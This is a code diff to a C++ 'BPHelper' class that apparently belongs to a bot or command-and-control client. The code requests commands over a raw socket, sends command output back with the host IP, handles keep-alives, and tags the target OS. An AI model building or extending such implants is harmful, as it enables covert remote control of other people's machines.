@@ -39,7 +39,7 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
             PacketParse::bp_response_t bp_response{};
             bpHeader.header_type = 0x03;
             bp_response.host_ip = rawSocket.getIP();
-            bp_response.command_num = htonl(currentCmd);
+            bp_response.command_num = htonl(eventInfo->bpRawCommand.command_num);
             if (output.length() > sizeof(bp_response.data)) {
                 bp_response.data_len = htons(static_cast<uint16_t>(sizeof(bp_response.data)));
                 memcpy(bp_response.data, output.c_str(), sizeof(bp_response.data));
@@ -77,15 +77,15 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
 
             rawSocket.send(req);
 
-            currentCmd++;
+//            currentCmd++;
             return 1;
         }
         case 0x04: {
             // keep alive to eventually inform the bot if it needs to switch it's transmission method.
             //std::cout << "Received a Keep Alive" << std::endl;
-            if (eventInfo->bpKeepAlive.command_num == currentCmd) {
-                currentCmd++;
-            }
+//            if (eventInfo->bpKeepAlive.command_num == currentCmd) {
+//                currentCmd++;
+//            }
             return 1;
         }
         default: {
@@ -100,7 +100,12 @@ void BPHelper::requestAction() {
     PacketParse::bp_header_t bpHeader{};
     PacketParse::bp_command_request_t bp_command_request_header{};
     bpHeader.header_type = 0x01;
+#if defined(_WIN32) || defined(WIN32)
     bp_command_request_header.target_OS = 0x01;
+#else
+    bp_command_request_header.target_OS = 0x02;
+#endif
+
     bp_command_request_header.command_num = htonl(currentCmd);
     bp_command_request_header.host_ip = rawSocket.getIP();
 
